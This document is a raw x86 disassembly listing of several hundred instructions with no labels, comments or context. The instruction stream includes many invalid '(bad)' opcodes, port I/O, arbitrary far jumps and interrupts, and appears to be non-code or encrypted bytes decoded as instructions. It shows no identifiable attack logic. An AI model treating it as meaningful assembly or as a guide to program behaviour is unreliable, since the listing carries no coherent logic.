  41ae12:	test   BYTE PTR [ecx+eiz*2-0x69],dl
  41ae16:	bound  esp,QWORD PTR [ebp+0x23]
  41ae19:	cdq    
  41ae1a:	test   DWORD PTR [ebp+ebx*1+0x16],0xad30dc65
  41ae22:	mov    al,ds:0x71730936
  41ae27:	in     eax,0xef
  41ae29:	mov    edi,0xe04862a3
  41ae2e:	pop    ebx
  41ae2f:	test   DWORD PTR [ebx],0xa4de98cb
  41ae35:	test   BYTE PTR [ebp+0x5f577ef3],dl
  41ae3b:	(bad)  
  41ae3c:	pop    ecx
  41ae3d:	test   DWORD PTR [ebx+0x1daf149a],ecx
  41ae43:	callw  0x204d
  41ae47:	sbb    ebp,ebx
  41ae49:	lods   eax,DWORD PTR ds:[esi]
  41ae4a:	imul   ebp,DWORD PTR [ecx-0x70],0xa9614a9d
  41ae51:	call   0xe90e3ee1
  41ae56:	mov    eax,0x61ec99aa
  41ae5b:	sub    ebx,ebx
  41ae5d:	js     0x41ae2b
  41ae5f:	fadd   st(7),st
  41ae61:	pop    esp
  41ae62:	in     eax,dx
  41ae63:	ins    BYTE PTR es:[edi],dx
  41ae64:	jge    0x41ae46
  41ae66:	inc    edi
  41ae67:	jmp    0x15b2fa1e
  41ae6c:	(bad)  
  41ae6d:	js     0x41aec2
  41ae6f:	(bad)  
  41ae70:	(bad)  
  41ae71:	(bad)  
  41ae72:	sbb    al,0x82
  41ae74:	test   BYTE PTR [esi-0x65],al
  41ae77:	stc    
  41ae78:	stos   BYTE PTR es:[edi],al
  41ae79:	and    BYTE PTR [esp+ebx*1],al
  41ae7c:	(bad)  
  41ae7d:	jno    0x41ae8f
  41ae7f:	aam    0x62
  41ae81:	adc    BYTE PTR [edx-0x49],dh
  41ae84:	sub    esi,esp
  41ae86:	lods   al,BYTE PTR ds:[esi]
  41ae87:	jmp    0xa7c33ad8
  41ae8c:	sahf   
  41ae8d:	and    ebx,edx
  41ae8f:	aam    0x18
  41ae91:	inc    eax
  41ae92:	dec    ebp
  41ae93:	sbb    DWORD PTR [edi-0x45b084a5],edx
  41ae99:	cmp    ch,BYTE PTR [esi]
  41ae9b:	mov    edi,0x3901dab
  41aea0:	jnp    0x41ae5d
  41aea2:	inc    ebp
  41aea4:	mov    bl,BYTE PTR [ecx]
  41aea6:	xchg   BYTE PTR [ecx-0x5bbdfb54],dh
  41aeac:	adc    al,0x1b
  41aeae:	jmp    0x24bf6d4b
  41aeb3:	xchg   ebx,eax
  41aeb4:	pop    edi
  41aeb5:	jae    0x41ae3b
  41aeb7:	mov    eax,0x39c54119
  41aebc:	mov    eax,0xc4683353
  41aec1:	imul   edx,DWORD PTR [esi],0x11
  41aec4:	cmp    al,BYTE PTR [eax-0x66]
  41aec7:	cwde   
  41aec8:	add    bh,BYTE PTR [edi+0x1]
  41aecb:	mov    ecx,DWORD PTR [ebp+0x962ac03]
  41aed1:	jp     0x41ae8d
  41aed3:	sbb    ecx,edx
  41aed5:	cwde   
  41aed6:	pusha  
  41aed7:	in     eax,dx
  41aed8:	pushf  
  41aed9:	scas   eax,DWORD PTR es:[edi]
  41aeda:	mov    dh,0x5d
  41aedc:	lods   al,BYTE PTR ds:[esi]
  41aedd:	cs (bad) 
  41aedf:	retf   
  41aee0:	jbe    0x41ae7e
  41aee2:	sub    ecx,0x2e
  41aee5:	sbb    eax,0xd15a345a
  41aeea:	adc    eax,DWORD PTR [edi]
  41aeec:	and    eax,0x25792777
  41aef1:	mov    ecx,DWORD PTR [edx]
  41aef3:	js     0x41af62
  41aef5:	adc    DWORD PTR [esi-0x53c1e13b],esi
  41aefb:	mov    ah,0xb7
  41aefd:	push   0xffffffd8
  41aeff:	test   BYTE PTR [esi+0x22de51f3],dl
  41af05:	clc    
  41af06:	sub    al,0x8
  41af08:	div    esp
  41af0a:	mov    DWORD PTR [eiz*2+0x451d7050],0x796184f3
  41af15:	shr    BYTE PTR [edi+0x21],1
  41af18:	xchg   esi,eax
  41af19:	jge    0x41aeef
  41af1b:	xor    BYTE PTR [edi+0x5ede5c85],0x38
  41af22:	push   ecx
  41af23:	ret    0x2dae
  41af26:	pop    eax
  41af27:	sbb    ch,BYTE PTR [edi+0x40323438]
  41af2d:	popf   
  41af2e:	cmp    eax,0x93302ab8
  41af33:	jg     0x41af5a
  41af35:	xor    ecx,edi
  41af37:	mov    ebx,0x2ca6e459
  41af3c:	rcl    BYTE PTR [ebx+0x4bc80e9],1
  41af42:	outs   dx,DWORD PTR ds:[esi]
  41af43:	aaa    
  41af44:	lods   eax,DWORD PTR ds:[esi]
  41af45:	push   ebp
  41af46:	cwde   
  41af47:	jne    0x41af76
  41af49:	cmp    eax,0xf31bec59
  41af4e:	jbe    0x41af10
  41af50:	jmp    0xfe25:0x775251c4
  41af57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af58:	xchg   ebp,eax
  41af59:	push   ebx
  41af5a:	xor    eax,DWORD PTR [edi+0x7e0e159]
  41af60:	xchg   edi,eax
  41af61:	sub    cl,cl
  41af63:	add    esi,DWORD PTR [esi+0x39]
  41af66:	mov    dl,0xf1
  41af68:	xchg   esi,eax
  41af69:	jb     0x41af1e
  41af6b:	mov    eax,ds:0x7005657e
  41af70:	jnp    0x41af5c
  41af72:	retf   0xe4c3
  41af75:	iret   
  41af76:	popfw  
  41af78:	pop    ebx
  41af79:	mov    bl,0x81
  41af7b:	mov    al,ds:0x42ece599
  41af80:	loope  0x41af82
  41af82:	push   esp
  41af84:	outs   dx,BYTE PTR ds:[esi]
  41af85:	ja     0x41af56
  41af87:	add    eax,0xa7606118
  41af8c:	fcmovnbe st,st(2)
  41af8e:	lahf   
  41af8f:	inc    ecx
  41af90:	imul   esp,DWORD PTR [edi+0x3c],0xffffff96
  41af94:	fsub   st(0),st
  41af96:	and    BYTE PTR [ecx+0x24d565bc],cl
  41af9c:	mov    esi,DWORD PTR [edi+0x3e]
  41af9f:	sub    BYTE PTR [esi],dl
  41afa1:	add    BYTE PTR [edi],bh
  41afa3:	inc    ebp
  41afa4:	in     al,0x8a
  41afa6:	arpl   WORD PTR [edi-0x1400b285],bp
  41afac:	mov    ah,0x57
  41afae:	call   0x232c:0x9175dbd5
  41afb5:	pushf  
  41afb6:	mov    edi,0x95367e5c
  41afbb:	fisubr DWORD PTR [eax]
  41afbd:	and    bl,BYTE PTR [edx-0x1d]
  41afc0:	sub    DWORD PTR [ebx],ecx
  41afc2:	inc    ebx
  41afc3:	test   eax,0x6152f3fd
  41afc8:	(bad)  
  41afc9:	fdivr  DWORD PTR [esi+0x7b]
  41afcc:	jl     0x41b04c
  41afce:	int    0xf3
  41afd0:	gs callw 0xa9a2
  41afd5:	xchg   edx,eax
  41afd6:	cmp    eax,0xfeb5ef97
  41afdb:	fadd   QWORD PTR [edi]
  41afdd:	cdq    
  41afde:	in     eax,0x3b
  41afe0:	inc    ebp
  41afe1:	rol    bl,cl
  41afe3:	(bad)  
  41afe5:	cwde   
  41afe6:	mov    dh,0x88
  41afe8:	and    eax,0x291c63b6
  41afed:	test   DWORD PTR [ecx-0x76],eax
  41aff0:	xor    BYTE PTR [ebx],ah
  41aff2:	sti    
  41aff3:	mov    ch,0x36
  41aff5:	fstp   QWORD PTR [eax+0x56]
  41aff8:	sbb    al,0xa
  41affa:	mov    eax,esi
  41affc:	stc    
  41affd:	(bad)  
  41affe:	sub    bl,BYTE PTR [ebx+0x5]
  41b001:	dec    esi
  41b002:	fs into 
  41b004:	and    ecx,esp
  41b006:	or     al,0x29
  41b008:	popa   
  41b009:	cmp    al,0xe4
  41b00b:	push   cs
  41b00c:	xlat   BYTE PTR ds:[ebx]
  41b00d:	outs   dx,DWORD PTR ds:[esi]
  41b00e:	mov    eax,ds:0x84af82e5
  41b013:	dec    esi
  41b014:	sbb    eax,0x27ac04d8
  41b019:	aaa    
  41b01a:	in     al,0x30
  41b01c:	sar    eax,1
  41b01e:	out    0xd7,eax
  41b020:	and    DWORD PTR [esi-0x6aacd789],eax
  41b026:	sub    al,0x2
  41b028:	test   eax,0x22a2636b
  41b02d:	jmp    0x7c3a:0xeccd2fb0
  41b034:	or     DWORD PTR [esi-0x42],edx
  41b037:	sbb    eax,0xa0801e50
  41b03c:	dec    eax
  41b03d:	repnz dec ebx
  41b03f:	lods   al,BYTE PTR ds:[esi]
  41b040:	cmp    ebx,esp
  41b042:	outs   dx,BYTE PTR ds:[esi]
  41b043:	cs inc ebp
  41b045:	jg     0x41b0b7
  41b047:	or     DWORD PTR [ecx+0x7b],ecx
  41b04a:	icebp  
  41b04b:	neg    DWORD PTR [edx-0x5]
  41b04e:	mov    ds:0xe1b8a525,al
  41b053:	loopne 0x41b037
  41b055:	rcr    BYTE PTR [ebp+0x47c986f3],cl
  41b05b:	and    dl,BYTE PTR [esi-0x21]
  41b05e:	mov    esp,0x25cbc58f
  41b063:	adc    DWORD PTR [ebp+0x57782fa2],ebx
  41b069:	cli    
  41b06a:	sbb    DWORD PTR [edx-0x2e],edi
  41b06d:	and    ch,BYTE PTR [ebx-0x39]
  41b070:	cdq    
  41b071:	pop    ds
  41b072:	xchg   ebx,eax
  41b073:	adc    al,0x4a
  41b075:	cmp    al,0xdc
  41b077:	imul   edx,edi,0x23f3cf86
  41b07d:	pop    ebx
  41b07e:	pop    ds
  41b07f:	les    esp,FWORD PTR [esi-0x59]
  41b082:	push   0xffffffb1
  41b084:	addr16 js 0x41b0c4
  41b087:	jge    0x41b014
  41b089:	mov    ebp,0xe5cf55a7
  41b08e:	jnp    0x41b0e0
  41b090:	in     al,dx
  41b091:	loope  0x41b0c6
  41b093:	dec    edi
  41b094:	not    BYTE PTR [edx+eiz*8+0x4c53163e]
  41b09b:	jp     0x41b05f
  41b09d:	clc    
  41b09e:	xlat   BYTE PTR ds:[ebx]
  41b09f:	stos   DWORD PTR es:[edi],eax
  41b0a0:	xlat   BYTE PTR ds:[ebx]
  41b0a1:	sbb    DWORD PTR [ebx+0x49b579e8],ecx
  41b0a7:	xchg   esi,eax
  41b0a8:	fld    DWORD PTR [ebp+0x7]
  41b0ab:	and    DWORD PTR [eax-0x59],ecx
  41b0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0af:	in     al,dx
  41b0b0:	repz ret 0x2534
  41b0b4:	in     eax,0xb8
  41b0b6:	cwde   
  41b0b7:	dec    ecx
  41b0b8:	fxam   
  41b0ba:	dec    edx
  41b0bb:	lods   eax,DWORD PTR ds:[esi]
  41b0bc:	pusha  
  41b0bd:	pop    es
  41b0be:	and    ebx,DWORD PTR [esi]
  41b0c0:	test   BYTE PTR [bx+si+0x37],ah
  41b0c4:	imul   ebx,DWORD PTR [ebx+0x70],0xffffffff
  41b0c8:	leave  
  41b0c9:	mov    eax,ds:0xb17a2d80
  41b0ce:	fs ret 
  41b0d0:	sub    esi,DWORD PTR [ecx+0x6a]
  41b0d3:	out    0x90,eax
  41b0d5:	adc    BYTE PTR [esi],al
  41b0d7:	jmp    DWORD PTR [ebp-0x75]
  41b0da:	shl    DWORD PTR [edx-0x71],1
  41b0dd:	xor    cl,BYTE PTR [eax+0x770889b8]
  41b0e3:	pop    ebp
  41b0e4:	mov    eax,ds:0x765d74f3
  41b0e9:	xor    ch,al
  41b0eb:	or     DWORD PTR [edx+0x15],ebx
  41b0ee:	in     eax,0x48
  41b0f0:	add    BYTE PTR [eax],bh
  41b0f2:	jge    0x41b121
  41b0f4:	mov    ds:0xc351911e,al
  41b0f9:	pop    es
  41b0fa:	sbb    BYTE PTR [ecx-0xc],bl
  41b0fd:	ret    
  41b0fe:	les    ecx,FWORD PTR [ecx+0x49]
  41b101:	hlt    
  41b102:	mov    bl,0x4
  41b104:	dec    ecx
  41b105:	sub    BYTE PTR [esi-0x2b6101ba],0x60
  41b10c:	adc    DWORD PTR [ebx],esi
  41b10e:	stos   DWORD PTR es:[edi],eax
  41b10f:	in     eax,dx
  41b110:	pusha  
  41b111:	sub    esp,esi
  41b113:	mov    ecx,DWORD PTR [ebp+0x50138bc4]
  41b119:	cwde   
  41b11a:	xor    BYTE PTR [edx+0x807acb0],dh
  41b120:	jmp    0x41b10b
  41b122:	test   DWORD PTR [edx],edi
  41b124:	jnp    0x41b190
  41b126:	and    ebx,DWORD PTR ds:0x442a9cfc
  41b12c:	sbb    esp,DWORD PTR [ebx+0x186b596c]
  41b132:	mov    edi,0x6280f1c
  41b137:	xchg   ebp,eax
  41b138:	sub    al,0x6c
  41b13a:	test   BYTE PTR [ecx],bl
  41b13c:	leave  
  41b13d:	push   esi
  41b13e:	pop    es
  41b13f:	les    esi,FWORD PTR [eax+0x2e3e6881]
  41b145:	inc    edx
  41b146:	and    eax,DWORD PTR [ebx]
  41b148:	push   esi
  41b149:	fs in  eax,dx
  41b14b:	mov    cl,0xec
  41b14d:	lods   eax,DWORD PTR ds:[esi]
  41b14e:	cdq    
  41b14f:	or     eax,0x63e180e8
  41b154:	adc    eax,DWORD PTR ds:0xe4baae24
  41b15a:	sbb    eax,DWORD PTR [ebp+0x71]
  41b15d:	vpmullw xmm2,xmm2,XMMWORD PTR [ecx+0x3ce818db]
  41b165:	test   DWORD PTR [edi+0x5d53b918],esi
  41b16b:	sbb    BYTE PTR ds:0x8a592f84,bl
  41b171:	fisubr WORD PTR [edx-0x76965cec]
  41b177:	out    dx,al
  41b178:	xlat   BYTE PTR ds:[ebx]
  41b179:	aam    0xbc
  41b17b:	push   ebp
  41b17c:	sti    
  41b17d:	push   eax
  41b17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b17f:	outs   dx,DWORD PTR ds:[esi]
  41b180:	jge    0x41b1ba
  41b182:	or     dh,BYTE PTR [esi+eiz*2+0x1a9e8d0]
  41b189:	arpl   WORD PTR [esi-0x42],si
  41b18c:	les    edx,FWORD PTR [esp+edi*1]
  41b18f:	bound  edi,QWORD PTR [edi]
  41b191:	retf   
  41b192:	pop    edx
  41b193:	aam    0x77
  41b195:	xor    DWORD PTR [esi+0x5c],0x837d1a6
  41b19c:	pop    ecx
  41b19d:	inc    edi
  41b19e:	pop    esp
  41b19f:	inc    ebx
  41b1a0:	loope  0x41b1cc
  41b1a2:	int    0x74
  41b1a4:	pop    ecx
  41b1a5:	mov    dl,0x19
  41b1a7:	push   es
  41b1a8:	(bad)  
  41b1a9:	ficom  WORD PTR [eax-0x29299398]
  41b1af:	inc    eax
  41b1b0:	dec    ecx
  41b1b1:	jge    0x41b1a9
  41b1b3:	inc    esp
  41b1b4:	jno    0x41b19c
  41b1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b7:	(bad)  
  41b1b9:	ror    BYTE PTR [edi+eiz*1-0xc],0xe0
  41b1be:	push   ebp
  41b1bf:	jo     0x41b178
  41b1c1:	daa    
  41b1c2:	adc    BYTE PTR [esp+ebp*8-0x50],al
  41b1c6:	add    al,BYTE PTR [eax+0x7f]
  41b1c9:	jecxz  0x41b1ff
  41b1cb:	retf   
  41b1cc:	dec    eax
  41b1cd:	mov    ?,WORD PTR [ecx+eax*4+0x5329419a]
  41b1d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1d5:	push   ss
  41b1d6:	idiv   DWORD PTR [ebx+edi*1+0x5a1d2c2a]
  41b1dd:	(bad)  
  41b1de:	hlt    
  41b1df:	shr    BYTE PTR [ecx],0x3b
  41b1e2:	cmp    eax,0x3a7e2fa1
  41b1e7:	int    0x24
  41b1e9:	or     esp,DWORD PTR [edx-0x1332a217]
  41b1ef:	inc    ebp
  41b1f0:	test   edx,ecx
  41b1f2:	sub    esi,DWORD PTR [eax-0x5b]
  41b1f5:	add    ah,dh
  41b1f7:	xchg   edi,eax
  41b1f8:	loop   0x41b20d
  41b1fa:	cmc    
  41b1fb:	mov    al,0x82
  41b1fd:	pop    ds
  41b1fe:	lods   al,BYTE PTR ds:[esi]
  41b1ff:	fucomi st,st(6)
  41b201:	add    ah,BYTE PTR [ebx-0x70]
  41b204:	mov    ds:0x172faf97,eax
  41b209:	xor    ebp,DWORD PTR [eax+0x2e]
  41b20c:	dec    ebp
  41b20d:	mov    bh,0xcd
  41b20f:	pop    edx
  41b210:	pop    edx
  41b211:	repnz in eax,0xca
  41b214:	sub    eax,edx
  41b216:	scas   al,BYTE PTR es:[edi]
  41b217:	mov    bl,0xe1
  41b219:	das    
  41b21a:	call   0xcda774d
  41b21f:	inc    edx
  41b220:	shr    DWORD PTR [esi+ebp*4+0x20cf1761],0xd2
  41b228:	adc    eax,0xfb971ffd
  41b22d:	sub    DWORD PTR [esi+0x14],ebx
  41b230:	aam    0xc
  41b232:	scas   eax,DWORD PTR es:[edi]
  41b233:	aaa    
  41b234:	pop    ds
  41b235:	outs   dx,DWORD PTR ds:[esi]
  41b236:	stos   BYTE PTR es:[edi],al
  41b237:	into   
  41b238:	int    0x4
  41b23a:	ins    BYTE PTR es:[edi],dx
  41b23b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b23c:	mov    es,WORD PTR [esi-0x4efef22e]
  41b242:	inc    edi
  41b243:	adc    BYTE PTR [ebx],bl
  41b245:	pop    ecx
  41b246:	int    0x22
  41b248:	ret    
  41b249:	adc    esp,DWORD PTR [eax+ecx*1-0x77]
  41b24d:	pop    esi
  41b24e:	imul   ebp,DWORD PTR [ecx+edx*8-0x76f74dfc],0xffffffc9
  41b256:	jge    0x41b215
  41b258:	in     eax,dx
  41b259:	lods   al,BYTE PTR ds:[esi]
  41b25a:	pop    ebx
  41b25b:	test   bh,dl
  41b25d:	aad    0xe4
  41b25f:	das    
  41b260:	pop    edx
  41b261:	inc    esi
  41b262:	in     al,dx
  41b263:	push   ss
  41b264:	fisttp QWORD PTR [edx]
  41b266:	(bad)  
  41b267:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b268:	sub    cl,BYTE PTR [edi]
  41b26a:	sub    esi,DWORD PTR [esi+0x46]
  41b26d:	ret    
  41b26e:	pop    ds
  41b26f:	jmp    0xa36c:0xfb33b809
  41b276:	mov    ah,0xca
  41b278:	jg     0x41b2ca
  41b27a:	xor    DWORD PTR [ebx],edx
  41b27c:	into   
  41b27d:	jne    0x41b2b8
  41b27f:	push   cs
  41b280:	dec    edx
  41b281:	mov    ds,WORD PTR [ebp-0x6f7abb23]
  41b287:	bound  edi,QWORD PTR [ebx+ecx*2-0x53]
  41b28b:	neg    DWORD PTR [edi]
  41b28d:	out    dx,al
  41b28e:	mov    ebx,0x8020a8a0
  41b293:	aam    0xa9
  41b295:	je     0x41b26b
  41b297:	fdivr  QWORD PTR [ecx]
  41b299:	in     eax,dx
  41b29a:	mov    DWORD PTR [ecx+0x66],esi
  41b29d:	pop    edx
  41b29e:	lods   eax,DWORD PTR ds:[esi]
  41b29f:	mov    esi,0xcad8b767
  41b2a4:	sahf   
  41b2a5:	test   al,0x29
  41b2a7:	ret    
  41b2a8:	fsubr  DWORD PTR [ebp+0x66]
  41b2ab:	fst    QWORD PTR [esi+0x75]
  41b2ae:	inc    ecx
  41b2af:	jbe    0x41b305
  41b2b1:	icebp  
  41b2b2:	popf   
  41b2b3:	push   edx
  41b2b4:	add    eax,0x3db3a94f
  41b2b9:	ins    DWORD PTR es:[edi],dx
  41b2ba:	jbe    0x41b277
  41b2bc:	adc    eax,0x9c03b338
  41b2c1:	int    0x2c
  41b2c3:	dec    ecx
  41b2c4:	pop    edx
  41b2c5:	push   ss
  41b2c6:	ds or  al,ah
  41b2c9:	jo     0x41b260
  41b2cb:	cli    
  41b2cc:	movups XMMWORD PTR [ebx],xmm0
  41b2cf:	cmp    BYTE PTR [edx+0x1e],bl
  41b2d2:	out    0xb0,eax
  41b2d4:	scas   eax,DWORD PTR es:[edi]
  41b2d5:	pop    ecx
  41b2d6:	pop    ecx
  41b2d7:	xor    edi,DWORD PTR [ebx]
  41b2d9:	jb     0x41b2dc
  41b2db:	sbb    DWORD PTR [edi-0x32e1bdd],ebx
  41b2e1:	test   al,0xb8
  41b2e3:	shr    DWORD PTR [eax-0x19],cl
  41b2e6:	out    0xc3,eax
  41b2e8:	data16 sbb dl,BYTE PTR [ecx-0x1d]
  41b2ec:	sub    al,0x44
  41b2ee:	adc    ah,BYTE PTR [eax-0x17]
  41b2f1:	ins    BYTE PTR es:[edi],dx
  41b2f2:	call   0x5d63e8ef
  41b2f7:	in     eax,0x5d
  41b2f9:	dec    ecx
  41b2fa:	add    ah,BYTE PTR [eax+eiz*1-0x55d210d4]
  41b301:	call   FWORD PTR [esi-0x2e1f459c]
  41b307:	sbb    al,BYTE PTR ds:0x5e9bbb5
  41b30d:	cmp    eax,0x27c91f0c
  41b312:	es jns 0x41b2b3
  41b315:	test   DWORD PTR [ecx+0x765c89b5],0x18c9d6c
  41b31f:	xchg   edx,eax
  41b320:	jno    0x41b32e
  41b322:	stos   DWORD PTR es:[edi],eax
  41b323:	pop    eax
  41b324:	mov    edx,0x4018410
  41b329:	push   es
  41b32a:	mov    ds:0x979fb7c5,eax
  41b32f:	or     esp,DWORD PTR [edi]
  41b331:	push   es
  41b332:	mov    eax,ds:0x19c86629
  41b337:	and    ah,bh
  41b339:	push   0xffffff9a
  41b33b:	addr16 sbb eax,0xce9cb02e
  41b341:	mov    eax,ds:0x98298813
  41b346:	jbe    0x41b2cc
  41b348:	sub    BYTE PTR [ebx-0x5e2f096b],ah
  41b34e:	cmp    al,0xa8
  41b350:	and    al,0x6b
  41b352:	clc    
  41b353:	aaa    
  41b354:	sti    
  41b355:	add    eax,0x986d8a80
  41b35a:	retf   0xabce
  41b35d:	pop    es
  41b35e:	xlat   BYTE PTR ds:[ebx]
  41b35f:	xchg   ebp,eax
  41b360:	inc    BYTE PTR [eax+0x4d217e71]
  41b366:	sub    eax,0x6a4a4554
  41b36b:	int3   
  41b36c:	data16 sbb ah,bl
  41b36f:	mov    eax,ds:0x277858c4
  41b374:	stos   BYTE PTR es:[edi],al
  41b375:	fwait
  41b376:	(bad)  
  41b377:	xchg   ebx,eax
  41b378:	jle    0x41b372
  41b37a:	xor    bl,BYTE PTR [edi+0x2695936b]
  41b380:	mov    esi,0xb56b0753
  41b385:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b386:	pop    ss
  41b387:	mov    dl,0x96
  41b389:	test   al,0x8
  41b38b:	fcom   DWORD PTR [ebp-0x20]
  41b38e:	stos   BYTE PTR es:[edi],al
  41b38f:	sti    
  41b390:	mov    ebp,0xeeffcbab
  41b395:	or     eax,0xda59166c
  41b39a:	popf   
  41b39b:	cmp    DWORD PTR [ecx+0x7f],0x28
  41b39f:	mov    ch,0x38
  41b3a1:	inc    ebp
  41b3a2:	pop    es
  41b3a3:	xchg   edx,eax
  41b3a4:	jmp    0x3a3:0xa473dbdd
  41b3ab:	jo     0x41b3eb
  41b3ad:	scas   eax,DWORD PTR es:[edi]
  41b3ae:	mov    ebp,0x98713bbc
  41b3b3:	leave  
  41b3b4:	or     bh,BYTE PTR [edi-0x77be7c83]
  41b3ba:	cli    
  41b3bb:	inc    ebp
  41b3bc:	gs dec esp
  41b3be:	fstp   TBYTE PTR [edi]
  41b3c0:	mov    BYTE PTR [edx+0x30],al
  41b3c3:	addr16 es gs mov edx,0x5a676e42
  41b3cb:	outs   dx,DWORD PTR ds:[esi]
  41b3cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3cd:	idiv   DWORD PTR [eax+0x24]
  41b3d0:	jno    0x41b398
  41b3d2:	ficom  DWORD PTR [esi-0x32dd38e2]
  41b3d8:	dec    ebp
  41b3d9:	add    ch,ah
  41b3db:	fisttp QWORD PTR [eax+0x66]
  41b3de:	lahf   
  41b3df:	cwde   
  41b3e0:	cdq    
  41b3e1:	(bad)  
  41b3e3:	xor    ebp,DWORD PTR [edi-0x349e0b1]
  41b3e9:	jae    0x41b38b
  41b3eb:	add    BYTE PTR [eax+0x60],cl
  41b3ee:	xor    ch,BYTE PTR [esi+0x2cd4c1a5]
  41b3f4:	and    ecx,DWORD PTR [edx]
  41b3f6:	lock je 0x41b3a5
  41b3f9:	fldcw  WORD PTR [esi-0x3c6f1f9f]
  41b3ff:	sub    BYTE PTR [edi-0x7627274b],0xab
  41b406:	fwait
  41b407:	ins    DWORD PTR es:[edi],dx
  41b408:	jnp    0x41b3de
  41b40a:	stos   BYTE PTR es:[edi],al
  41b40b:	and    eax,0x239994ec
  41b410:	sub    DWORD PTR [esp+edx*2],edx
  41b413:	inc    ebp
  41b414:	into   
  41b415:	ins    DWORD PTR es:[edi],dx
  41b416:	lods   al,BYTE PTR ds:[esi]
  41b417:	test   DWORD PTR [ebx],ebx
  41b419:	jecxz  0x41b472
  41b41b:	fs stos DWORD PTR es:[edi],eax
  41b41d:	jge    0x41b46e
  41b41f:	bnd jne 0x41b3e9
  41b422:	retf   0x12c3
  41b425:	scas   al,BYTE PTR es:[edi]
  41b426:	clc    
  41b427:	cs xor ecx,esp
  41b42a:	mov    WORD PTR [edi+0x1a],ss
  41b42d:	mov    ah,0xbf
  41b42f:	pop    edx
  41b430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b431:	pop    esp
  41b432:	(bad)  
  41b433:	ficomp WORD PTR [edx-0x12]
  41b436:	cld    
  41b437:	out    dx,al
  41b438:	daa    
  41b439:	shl    BYTE PTR ds:0x7f47a6cb,cl
  41b43f:	sub    ebp,DWORD PTR [edx+0x6f]
  41b442:	daa    
  41b443:	mov    al,0xa6
  41b445:	push   ebp
  41b446:	push   esp
  41b447:	inc    esi
  41b448:	or     DWORD PTR [ebx+edx*2],eax
  41b44b:	je     0x41b470
  41b44d:	lahf   
  41b44e:	dec    eax
  41b44f:	(bad)  
  41b450:	mov    eax,ds:0x7940071
  41b455:	add    DWORD PTR [edi+esi*2+0x499a0df4],edx
  41b45c:	mov    eax,ds:0x997d902b
  41b461:	fwait
  41b462:	add    esi,DWORD PTR [eax+eiz*1+0x4f]
  41b466:	loope  0x41b458
  41b468:	cmc    
  41b469:	enter  0xcf09,0x83
  41b46d:	add    al,0xb
  41b46f:	fwait
  41b470:	push   ds
  41b471:	test   al,0xc3
  41b473:	stos   BYTE PTR es:[edi],al
  41b474:	(bad)  
  41b475:	dec    edi
  41b476:	ret    0xd6d1
  41b479:	mov    esp,0xe1c32c8d
  41b47e:	add    dh,cl
  41b480:	ins    DWORD PTR es:[edi],dx
  41b481:	cli    
  41b482:	sti    
  41b483:	popf   
  41b484:	xor    BYTE PTR [ebx],ch
  41b486:	aaa    
  41b487:	push   ss
  41b488:	jp     0x41b42a
  41b48a:	xchg   esi,eax
  41b48b:	mov    ch,BYTE PTR [ebx]
  41b48d:	out    0x5c,al
  41b48f:	xor    al,0x39
  41b491:	jmp    0x7a94a9d9
  41b496:	loopne 0x41b457
  41b498:	dec    esi
  41b499:	mov    bl,0x45
  41b49b:	push   esi
  41b49c:	xor    eax,0xdeb3ac7c
  41b4a1:	addr16 ret 0xc9f0
  41b4a5:	and    eax,0x6439d00b
  41b4aa:	outs   dx,BYTE PTR ds:[esi]
  41b4ab:	adc    DWORD PTR [esi+0x77],esi
  41b4ae:	adc    DWORD PTR [esi],0x9f9d7ca6
  41b4b4:	mov    edx,0x2f8339e9
  41b4b9:	dec    esp
  41b4ba:	aad    0x7a
  41b4bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4bd:	nop
  41b4be:	dec    edi
  41b4bf:	test   eax,0x6ae8e4cf
  41b4c4:	jns    0x41b4a3
  41b4c6:	xor    al,dh
  41b4c8:	loopne 0x41b48a
  41b4ca:	jge    0x41b48c
  41b4cc:	pop    ecx
  41b4cd:	dec    ebp
  41b4ce:	aad    0xbb
  41b4d0:	push   ds
  41b4d1:	inc    edx
  41b4d2:	adc    BYTE PTR [edi+0x68],dl
  41b4d5:	out    dx,al
  41b4d6:	repnz xor al,0x51
  41b4d9:	aad    0xbe
  41b4db:	repz dec esi
  41b4dd:	outs   dx,BYTE PTR ds:[esi]
  41b4de:	daa    
  41b4df:	mov    esp,0xd6b1ccf7
  41b4e4:	sbb    BYTE PTR [eax+0x686de0ed],bl
  41b4ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ec:	int3   
  41b4ed:	rcr    DWORD PTR [edx-0x2a],cl
  41b4f0:	xchg   ax,ax
  41b4f2:	retf   
  41b4f3:	sub    ecx,eax
  41b4f5:	and    dl,BYTE PTR [esi+0x1f75c2a4]
  41b4fb:	in     eax,dx
  41b4fc:	jle    0x41b519
  41b4fe:	xor    eax,0x8d8e79d3
  41b503:	in     al,0xda
  41b505:	push   eax
  41b506:	imul   esp,ebx,0x1cc53c9a
  41b50c:	mov    ah,0x8a
  41b50e:	js     0x41b555
  41b510:	pop    eax
  41b511:	arpl   cx,dx
  41b513:	jge    0x41b51a
  41b515:	xchg   ebx,eax
  41b516:	pop    ebx
  41b517:	jnp    0x41b562
  41b519:	fst    DWORD PTR [ecx+0x4d]
  41b51c:	fist   WORD PTR [eax-0x1e3a90b0]
  41b522:	shr    BYTE PTR [ebx],cl
  41b524:	jnp    0x41b53f
  41b526:	ror    ebx,1
  41b528:	sbb    DWORD PTR [eax],0x180d6968
  41b52e:	inc    eax
  41b52f:	mov    eax,ds:0xf1eb7dad
  41b534:	dec    edx
  41b535:	pop    ecx
  41b536:	loop   0x41b580
  41b538:	add    eax,0xf0efdd41
  41b53d:	ret    
  41b53e:	mov    al,0x17
  41b540:	cmp    eax,0x9f00b175
  41b545:	mov    cl,BYTE PTR [edx+0x30]
  41b548:	neg    bl
  41b54a:	fs inc ecx
  41b54c:	mov    esi,0xace577e8
